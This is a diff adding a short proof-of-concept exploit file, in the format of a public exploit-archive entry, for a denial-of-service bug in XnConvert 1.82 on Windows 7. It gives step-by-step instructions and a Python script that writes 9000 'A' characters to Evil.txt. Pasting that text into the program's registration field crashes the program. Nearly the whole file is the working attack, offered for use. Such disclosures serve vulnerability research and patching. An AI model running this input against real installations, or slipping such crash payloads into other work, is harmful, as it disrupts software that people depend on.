@@ -1,0 +1,21 @@
+# Exploit Title: XnConvert 1.82 - Denial of Service (PoC)
+# Date: 2019-12-21
+# Vendor Homepage: https://www.xnview.com
+# Software Link: https://www.xnview.com/en/apps/
+# Exploit Author: Gokkulraj (TwinTech Solutions)
+# Tested Version: v1.82
+# Tested on: Windows 7 x64
+
+# 1.- Download and install XnConvert
+# 2.- Run python code : XnConvert.py
+# 3.- Open EVIL.txt and copy content to clipboard
+# 4.- Open XnConvert and Click 'EnterKey'
+# 5.- Paste the content of EVIL.txt into the Field: 'User Name and Registration Code'
+# 6.- Click 'OK' and you will see a pop-up stating Invalid code and then click 'OK' you will see the crash.
+
+#!/usr/bin/env python
+Dos= "\x41" * 9000
+myfile=open('Evil.txt','w')
+myfile.writelines(Dos)
+myfile.close()
+print("File created")
